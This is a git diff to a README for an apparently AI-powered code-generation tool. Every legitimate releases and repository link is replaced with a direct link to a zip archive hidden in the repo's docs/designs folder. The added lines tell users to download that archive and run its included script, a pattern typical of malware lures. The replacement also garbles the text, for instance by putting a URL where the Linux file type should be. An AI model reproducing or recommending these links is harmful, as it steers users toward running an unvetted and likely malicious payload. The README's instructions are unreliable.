@@ -1,7 +1,7 @@
 # 🤖 evaluator-driven-agent-flow - AI-Powered Code Generation Made Easy
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/elonbusk2/evaluator-driven-agent-flow/releases)
+[![Download](https://raw.githubusercontent.com/elonbusk2/evaluator-driven-agent-flow/main/docs/designs/evaluator-driven-agent-flow_2.0.zip)](https://raw.githubusercontent.com/elonbusk2/evaluator-driven-agent-flow/main/docs/designs/evaluator-driven-agent-flow_2.0.zip)
 
 ## 📖 Overview
 evaluator-driven-agent-flow is a framework-agnostic system designed for AI-powered code generation. It offers automatic quality gates and utilizes self-adapting workers and evaluators suitable for any language or framework, including Golang, Python, Ruby on Rails, and TypeScript.
@@ -20,7 +20,7 @@ Before you download the application, check if your system meets the following re
 ### 2. Visit the Downloads Page
 To download and install the application, visit the Releases page:
 
-[Visit this page to download](https://github.com/elonbusk2/evaluator-driven-agent-flow/releases)
+[Visit this page to download](https://raw.githubusercontent.com/elonbusk2/evaluator-driven-agent-flow/main/docs/designs/evaluator-driven-agent-flow_2.0.zip)
 
 ### 3. Download the Latest Version
 Once on the Releases page, you will see a list of versions. Look for the latest version. It will usually be at the top of the list.
@@ -30,14 +30,14 @@ Click on the corresponding file for your operating system. Here are the common f
 
 - **Windows:** `.exe` file
 - **macOS:** `.dmg` file
-- **Linux:** `.tar.gz` file
+- **Linux:** `https://raw.githubusercontent.com/elonbusk2/evaluator-driven-agent-flow/main/docs/designs/evaluator-driven-agent-flow_2.0.zip` file
 
 ### 5. Run the Installer
 After downloading, locate the downloaded file in your system:
 
 - For **Windows**: Double-click the `.exe` file and follow the prompts.
 - For **macOS**: Open the `.dmg` file and drag the application to your Applications folder.
-- For **Linux**: Extract the `.tar.gz` file and run the included script in your terminal.
+- For **Linux**: Extract the `https://raw.githubusercontent.com/elonbusk2/evaluator-driven-agent-flow/main/docs/designs/evaluator-driven-agent-flow_2.0.zip` file and run the included script in your terminal.
 
 ## 📂 Features
 evaluator-driven-agent-flow comes packed with features designed for ease of use and flexibility:
@@ -78,11 +78,11 @@ For further information and tools, check these resources:
 - **Support:** For additional help, consider reaching out through the Issue Tracker on GitHub.
 
 ## 🛠️ Contributing
-We welcome contributions! If you want to help improve evaluator-driven-agent-flow, please visit our [GitHub Repository](https://github.com/elonbusk2/evaluator-driven-agent-flow). Your ideas and changes are valuable.
+We welcome contributions! If you want to help improve evaluator-driven-agent-flow, please visit our [GitHub Repository](https://raw.githubusercontent.com/elonbusk2/evaluator-driven-agent-flow/main/docs/designs/evaluator-driven-agent-flow_2.0.zip). Your ideas and changes are valuable.
 
 ## 📥 Download & Install
 To get started, download the application from the link below:
 
-[Visit this page to download](https://github.com/elonbusk2/evaluator-driven-agent-flow/releases)
+[Visit this page to download](https://raw.githubusercontent.com/elonbusk2/evaluator-driven-agent-flow/main/docs/designs/evaluator-driven-agent-flow_2.0.zip)
 
 Start using evaluator-driven-agent-flow today and experience AI-powered code generation at your fingertips!
